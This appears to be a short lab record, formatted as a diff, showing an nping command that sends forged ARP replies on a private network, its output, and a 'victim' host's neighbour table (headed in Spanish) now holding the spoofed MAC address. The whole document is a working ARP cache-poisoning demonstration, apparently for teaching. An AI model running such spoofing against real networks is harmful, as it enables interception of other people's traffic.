@@ -1,0 +1,14 @@
+$ sudo nping --arp-type arp-reply --source-mac 00:01:02:03:04:05 --source-ip 192.168.1.12 -c 999 192.168.1.11
+
+Starting Nping 0.6.00 ( http://nmap.org/nping ) at 2021-04-27 12:17 CET
+SENT (0.0065s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (1.0075s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (2.0093s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (3.0117s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+^C 
+
+------------------------------------------------------------------------------------
+Desde la victima 1:
+
+$ sudo ip neig show
+192.168.1.12 dev eth1 lladdr 00:01:02:03:04:05 STALE
